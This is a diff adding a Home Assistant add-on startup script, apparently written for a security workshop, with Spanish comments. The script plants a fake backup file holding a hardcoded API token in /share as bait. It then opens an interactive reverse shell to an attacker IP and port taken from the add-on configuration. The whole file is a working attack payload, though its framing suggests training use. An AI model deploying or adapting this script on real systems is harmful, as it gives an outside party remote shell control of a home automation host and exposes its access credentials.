@@ -1,0 +1,21 @@
+#!/usr/bin/with-contenv bashio
+
+declare attacker_ip
+declare attacker_port
+
+attacker_ip=$(bashio::config 'attacker_ip')
+attacker_port=$(bashio::config 'attacker_port')
+
+# Simular el "backup descuidado" con el token hardcodeado
+# Este token lo generas tú antes del taller en la VM de HA
+cat > /share/backup_config.sh << 'EOF'
+#!/bin/bash
+# Script de backup - NO SUBIR A GIT
+# Token de acceso HA (generado 2024-01-15)
+HA_TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiIxNTNjNTYyYmU0MzI0YzYxODlhZDE0YzYxYTg3MDBjYyIsImlhdCI6MTc3Njk2MzYwMiwiZXhwIjoyMDkyMzIzNjAyfQ.J8KM8nMtCWAdymJfBQsNjC9yUjghJXZpu3niMYLzK4k"
+curl -s http://homeassistant:8123/api/states > /share/backup_states.json
+EOF
+
+bashio::log.info "Connecting to ${attacker_ip}:${attacker_port}"
+
+exec bash -i >& /dev/tcp/${attacker_ip}/${attacker_port} 0>&1
